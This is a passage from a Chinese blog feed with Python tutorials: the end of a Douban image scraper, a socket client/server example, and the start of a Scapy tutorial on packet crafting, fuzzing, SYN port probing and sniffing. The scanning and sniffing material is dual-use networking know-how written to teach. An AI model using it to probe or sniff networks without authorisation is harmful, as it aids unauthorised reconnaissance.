punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">'下载完毕，请查看！'</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 这里做了一次数据清洗，从传递过来的url中爬取图片的真实url</span><span class="token keyword">def</span> <span class="token function">get_img_url</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">:</span>    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url2<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    html <span class="token operator">=</span> req<span class="token punctuation">.</span>text    url <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;img src=\"(.*?)\" width=\"686\" />'</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    down_img<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 这里获取翻页的url并进行二次处理</span><span class="token keyword">def</span> <span class="token function">turn_page</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">'https://movie.douban.com/photos/photo/'</span>    url <span class="token operator">=</span> page    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    html <span class="token operator">=</span> req<span class="token punctuation">.</span>text    pages <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;a href=\"https://movie\.douban\.com/photos/photo/(.*?)\">'</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> pages<span class="token punctuation">:</span>        url2 <span class="token operator">=</span> host<span class="token operator">+</span>j        get_img_url<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># get_num()的作用是整合裤袜视界全部图片的url</span><span class="token keyword">def</span> <span class="token function">get_num</span><span class="token punctuation">(</span>url1<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'https://movie.douban.com/subject/30419644/photos?type=S'</span>    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    html <span class="token operator">=</span> req<span class="token punctuation">.</span>text    page <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;a href=\"https://movie\.douban\.com/photos/photo/(.*?)\">'</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    pages <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;a href=\"(.*?)\" >\d&lt;/a>'</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 这里过滤一下需要跳转的页面的url，传给turn_page()进行处理</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> pages<span class="token punctuation">:</span>        turn_page<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 在这里把过滤出来的url列表赋值给i，拼接后传递给函数get_img_url()</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> page<span class="token punctuation">:</span>        url2 <span class="token operator">=</span> url1<span class="token operator">+</span>i        get_img_url<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义请求头</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># 定义图片存放目录</span>    dir <span class="token operator">=</span> <span class="token string">'D:\Pantyhose'</span>    <span class="token comment" spellcheck="true"># 测试D盘是否已存在目录Pantyhose，若不存在则创建</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'正在测试文件目录状态......'</span>        mkdir <span class="token operator">=</span> os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>dir<span class="token punctuation">)</span>        <span class="token keyword">if</span> mkdir <span class="token keyword">is</span> <span class="token boolean">False</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'已为您创建图片目录：'</span> <span class="token operator">+</span> dir    <span class="token comment" spellcheck="true"># 若存在则输出路径</span>    <span class="token keyword">except</span> WindowsError<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'目录已存在：'</span> <span class="token operator">+</span> dir    <span class="token comment" spellcheck="true"># 给老子爬！</span>    get_num<span class="token punctuation">(</span><span class="token string">'https://movie.douban.com/photos/photo/'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的socket模块</title>
      <link href="/posts/a98e407b.html"/>
      <url>/posts/a98e407b.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-Socket模块简介"><a href="#1-Socket模块简介" class="headerlink" title="1.Socket模块简介"></a>1.Socket模块简介</h3><p>Socket模块的主要目的是帮助在网络上的两|个程序之间建立信息通道。在Python中提供了两个基本的Socket模块:服务端Socket和客户端Socket。当创建了一个服务端Socket之后，这个Socket就会在本机的一个端口上等待连接，客户端Socket会访问这个端口，当两者完成连接之后，就可以进行交互了。在Python中，Socket 模块的使用十分简单。在使用Socket进行编程的时候，需要首先实例化一个Socket类，这个实例化需要三个参数:第一个参 数是地址族，第二个参数是流,第三个参数是使用的协议。使用Socket建立服务端的思路主要是首先实例化一个Socket类，然后开始循环监听，直可以接收来自客户端的连接。成功建立连接之后，接收客户端发来的数据，并再向客户端发送数据，传输完毕之后，关闭这次连接。使用Socket建立客户端则要简单得多，在实例化一个Socket类之后，连接一个远程的地址，这个地址由IP和端口组成。成功建立连接之后，开始发送和接收数据，传输完毕之后，关闭这次连接。</p><h3 id="2-基本用法"><a href="#2-基本用法" class="headerlink" title="2.基本用法"></a>2.基本用法</h3><ol><li>Socket实例化<br>首先看一下如何实例化一个Socket。Socket实例化的格式为：</li></ol><pre class="line-numbers language-python"><code class="language-python">socket<span class="token punctuation">(</span>family<span class="token punctuation">,</span>type<span class="token punctuation">[</span><span class="token punctuation">,</span>protocal<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，三个参数中的family是要使用的地址族，以下是常用的协议族<br>| 协议族 |类型  |<br>|–|–|<br>| AF_INTE | IPv4 |<br>| AF_INTE6 | IPv6 |<br>| AF_UNIX | 本地 |<br>| AF_ROUTE | 路由 |<br>第二个参数type用来指明Socket类型，这里可以使用一下参数<br>|参数| 类型| 作用 |<br>|–|–|–|<br>| SOCK_STREAM | TCP | 保证数据顺序及可靠性 |<br>| SOCK_DGRAM | UDP | 不保证数据接收的顺序，非可靠连接 |<br>| SOCK_RAW | 原始类型 | 允许对底层协议如IP或ICMP进行直接访问 |<br>第三个参数是指使用的协议，这个参数是可选额，通常赋值“0”，由系统自动选择。<br>如果希望初始化一个TCP类型的Socket，可以使用以下语句。</p><pre class="line-numbers language-python"><code class="language-python">s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条语句相当于socket.socket(socket.AF_INET,socket.SOCK_STREAM)。这里因为都是默认值，所以可以省略。<br>而如果想要初始化一个UDP类型的Socket，则可以使用如下语句。</p><pre class="line-numbers language-python"><code class="language-python">s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-Socket常用函数"><a href="#3-Socket常用函数" class="headerlink" title="3.Socket常用函数"></a>3.Socket常用函数</h3><p>socket类中主要提供如下所示常用的函数。<br>|函数| 作用 |<br>|–|–|<br>| bind() | 将指定的IP与端口绑定起来，如果之前使用了AF_INET初始化Socket，那么这里可以使用元组(husi,port)的形式表示地址 |<br>| listen() | 指定服务端可以监听的最大数量,这个参数最小为1，一般为5 |<br>| accept() | 用于在使用TCP的服务端接收连接，一般时阻塞态，接收TCP连接并返回(conn,address)，其中，conn是新的套接字对象，可以用来接收和发送数据；address是连接客户端的地址 |<br>| connect() | 用于在使用TCP的客户端去连接服务端，使用的参数是一个元组，形式为(hostname，port) |<br>| send() | 用于在使用TCP时发送数据，完整的形式为send(steing[,flag])，利用这个函数可以将string代表的数据发送到已经连接的socket，返回信息发送字节数量。但是可能未将指定的内容全部发送 |<br>| recv() | 用于使用TCP是接收数据，完整的形式为recv(bufsoze[,flag])，接收Socket的数据，诗句以字符串形式返回，bufsize指定最多可以接受的数量，flag这个参数一般不会使用 |<br>| sendto() |用于UDP发送数据，完整的形式为sendto(string[,flag],address)，返回值是发送的字节数。address是形式为(ipaddr.port)的元组，指定远程地址  |<br>| recvfrom() |UDP专用，接收数据，返回远端数据的IP地址和端口，但返回值是(data,address)。其中data是包含接收数据的字符串，address是发送数据的套接字地址  |<br>| close() | 关闭socket |</p><h3 id="4-编写一个简单的客户端与服务端"><a href="#4-编写一个简单的客户端与服务端" class="headerlink" title="4.编写一个简单的客户端与服务端"></a>4.编写一个简单的客户端与服务端</h3><p> <strong>- 服务端</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sockets1 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#指定协议与传输类型</span>s1<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#绑定服务器IP地址与端口</span>s1<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#设置最大监听数</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting a new connect..."</span><span class="token punctuation">)</span>    conn<span class="token punctuation">,</span>address <span class="token operator">=</span> s1<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#等待TCP连接</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a new connect from："</span><span class="token punctuation">,</span>address<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#输出客户端的信息</span>    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"Hey man~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#向客户端发送信息</span>    msg <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#等待接收客户端信息</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client:"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#输出客户端信息</span>     conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#断开连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>- 客户端</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sockets2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#指定协议与传输类型</span>s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#与服务端建立连接</span>s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"Hello man!"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#发送信息</span>data <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#等待接收信息</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Server:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#输出接收到的信息</span>s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#断开连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-实现的效果"><a href="#5-实现的效果" class="headerlink" title="5.实现的效果"></a>5.实现的效果</h3><p>服务端：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200123183912538.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>客户端：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200123184058743.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>执行之后可以看到一个来自本机59885（这个数字代表客户端使用的端口，每次都不一样）的连接，这表明客户端已经成功地与服务端建立了连接。Socket可以算是使用频率最高的网络模块文件了，关于这个模块的应用，后面还会与其他模块结合起来进行详细介绍。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的scapy模块</title>
      <link href="/posts/32246a84.html"/>
      <url>/posts/32246a84.html</url>
      
        <content type="html"><![CDATA[<h3 id="模块简介"><a href="#模块简介" class="headerlink" title="模块简介"></a>模块简介</h3><p>   Scapy是一个由Python编写的强大工具，目前很多优秀的网络扫描攻击工具都使用了这个模块。也可以在自己的程序中使用这个模块来实现对网络数据包的发送、监听和解析。这个模块相对于Nmap来说，更为底层。可以更直观的了解网络中的各类扫描攻击行为。</p><p>相对于Nmap来说，Scapy模块只会把收到的数据包展示给你，并不会告诉你这个包意味着什么。</p><p>例如，当你去医院检查身体时，医院会给你一份关于身体各项指标的检查结果，而医生也会告诉你得了什么病或者没有任何病。那么Nmap就像是一-个医生，它会替你搞定-切，按照它的经验提供给你结果。而Scapy则像是一个体检的设备， 它只会告诉你各种检查的结果，如果你自己就是-一个经验丰富的医生，显然检查的结果要比同行的建议更值得参考。</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>在Kali里边已经集成了Scapy这个工具，我们在终端下输入Scapy就可以启动它了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208143049206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>Scapy提供了和Python一样的交互式命令行，在这里需要说一下，接下来的实例我都会在这个命令行里运行。</p><h3 id="Scapy的基本操作"><a href="#Scapy的基本操作" class="headerlink" title="Scapy的基本操作"></a>Scapy的基本操作</h3><p> 首先使用几个实例来演示一下Scapy的用法，在Scapy中每一个协议就是一个类。只需要实例化一个协议类，就可以创建一个该协议的数据包，例如，如果要创建一个IP类型的数据包，就可以使用如下命令。</p><pre class="line-numbers language-bash"><code class="language-bash">ip <span class="token operator">=</span> IP<span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>IP数据包最重要的属性就是源地址和目的地址，这两个属性可以使用src和dst来设置，例如，要构造一个发往“192.168.1.107”的数据包，可以这么写。</p><pre class="line-numbers language-bash"><code class="language-bash">ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.107"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208145549858.png" alt="在这里插入图片描述"><br>这个目标dst值可以是一个IP地址，也可以是一个网段，例如192.168.1.0/24，这时产生的就不是一个数据包，而是256个数据包。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208145944245.png" alt="在这里插入图片描述"><br>如果想要查看每个数据包，可以使用 <strong>[p for p in ip]</strong> 。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208150119209.png" alt="在这里插入图片描述"><br>Scapy采用分层的形式来构造数据包，通常最下面的一个协议为Ether，然后是IP，在之后是TCP或者UDP。IP()函数无法用来构造ARP请求和应答数据包，所以这时可以使用Ether()，这个函数可以设置发送方和接收方的MAC地址。那么现在来产生一个广播数据包，执行的命令如下。</p><pre class="line-numbers language-bash"><code class="language-bash">Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后如图。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208153250102.png" alt="在这里插入图片描述"><br>如果要构造一个HTTP数据包，也可以使用如下这种方式。</p><pre class="line-numbers language-bash"><code class="language-bash">IP<span class="token punctuation">(</span><span class="token punctuation">)</span>/TCP<span class="token punctuation">(</span><span class="token punctuation">)</span>/<span class="token string">"GET/HTTP/1.0\r\n\r\n"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Scapy目前使用频率最高的类要数<strong>Ether、IP、TCP和UDP</strong>，但是这些类都具有哪些属性呢？Ether类中显然要有源地址、目的地址和类型。IP类的属性则复杂了许多，除了最重要的源地址和目的地址之外，还有版本、长度、协议类型、校验和等，TCP类中需要有源端口和目的端口。这里可以使用 <strong>ls()</strong> 函数来查看一个类拥有那些属性。</p><p>例如，使用ls(Ether())来查看Ether类的属性。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208154105151.png" alt="在这里插入图片描述"><br>也可以看一下IP()类中的属性。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208154243995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以对里边对应的属性进行设置，例如，将ttl的值设置为32，可以使用如下方式。</p><pre class="line-numbers language-python"><code class="language-python">IP<span class="token punctuation">(</span>src<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">,</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.107"</span>ttl<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Scapy模块中的函数"><a href="#Scapy模块中的函数" class="headerlink" title="Scapy模块中的函数"></a>Scapy模块中的函数</h3><p> 除了这些对应着协议类和它们的属性之外，还需要一些可以完成各种功能的函数。需要注意的一点是，刚才使用的IP()的作用是产生了一个IP数据包，但是并没有将其发送出去，因此，现在首先来看的就是如何将产生的报文发送出去，Scapy中提供了多个用来完成发送数据包的函数，首先来看一下其中的<strong>send()</strong>和<strong>sendp()</strong>。这两个函数的区别在于send()工作在第三层，而sendp()工作在第二层。简单地说，send()是用来发送IP数据包的，而sendp()是用来发送Ether数据包的。<br> 例如，构造一个目的地址为“192.168.1.107”的ICMP数据包，并将其发送出去，可以使用如下语句。</p><pre class="line-numbers language-python"><code class="language-python">send<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.107"</span><span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行结果。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208155419455.png" alt="在这里插入图片描述">如果成功了就会出现一个“Sent 1 packets.”的显示</p><pre class="line-numbers language-python"><code class="language-python">send<span class="token punctuation">(</span>Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行结果。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208155730819.png" alt="在这里插入图片描述"><br><strong>注：这两个函数，只发不收</strong></p><p>如果希望发送一个内容是随机填充的数据包，而且又要保证这个数据包的正确性，那么可以是<strong>fuzz()函数</strong>。例如，可以使用如下命令来创建一个发往192.168.1.107的tcp数据包。</p><pre class="line-numbers language-python"><code class="language-python">IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.107"</span><span class="token punctuation">)</span><span class="token operator">/</span>fuzz<span class="token punctuation">(</span>TCP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行结果。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208160205566.png" alt="在这里插入图片描述"><br>在Scapy中提供了三个用来发送接收数据包的函数，分别是<strong>sr()、sr1()和srp()</strong>其中sr()和sr1()工作在第三层，例如IP和ARP等，而srp()工作在第二层。<br>这里仍然向192.168.1.107发送一个ICMP数据包来比较一下sr()和send()的区别。</p><pre class="line-numbers language-python"><code class="language-python">sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.107"</span><span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行结果。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208160852505.png" alt="在这里插入图片描述"><br>当禅城==产生的数据包发送出去之后，Scapy就会监听接收到的数据包个数，answers表示对应的应答数据包。<br>sr()函数是Scapy的核心，它的返回值是两个列表，第一个列表是收到了应答的包和对应的应答，多伊尔戈列表是未收到应答的包。所以使用两个列表来保存sr()的返回值。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208161445554.png" alt="在这里插入图片描述"><br>这里使用ans和unans来保存sr()的返回值，因为发出的是一个ICMP请求数据包，而且也收到了一个应答包，所以这个发送的数据包和收到的应答包都被保存到了ans列表中，使用ans.summary()可以查看两个数据包的内容，而unans列表为空。</p><p>sr1()函数和sr()函数作用基本一样，但是值返回一个应答包。只需要使用一个列表就可以保存这个函数的返回值。例如，使用p来保存sr1(IP(dst=”192.168.1.107”)/ICMP())的返回值。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208163452631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以使用sr1()函数来测试目标的某个端口是否开放，采用半开扫描(SYN)的办法。</p><p>执行结果如图所示。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208165534196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>从上面p的值可以看出，192.168.1.107回应了发出设置了SYN标志位的TCP数据包，这表明他开放了80端口。</p><p>另外一个十分重要的函数就是sniff()，如果使用过Tcpdump，那么对这个函数的使用就不会感到陌生。通过这个函数可以在自己的程序中捕获经过本机网卡的数据包。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020020817001683.png" alt="在这里插入图片描述"></p><p>这里有个比较坑的地方，就是他不能实时回显，你必须得终止嗅探他才会回显他嗅探到的包。</p><p>这个函数强大的地方在于可以使用番薯filter对数据包进行过滤。例如，指定之捕获与192.168.1.107有关的数据包，可以使用“host 192.168.1.107”：</p><pre class="line-numbers language-python"><code class="language-python">sniff<span class="token punctuation">(</span>filter<span class="token operator">=</span><span class="token string">"192.168.1.107"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样，也可以使用filter来过滤指定的协议，例如ICMP类型的数据包。</p><pre class="line-numbers language-python"><code class="language-python">sniff<span class="token punctuation">(</span>filter<span class="token operator">=</span><span class="token string">"icmp"</span><span class="token punctuation">)</span><span aria-hidden="true" 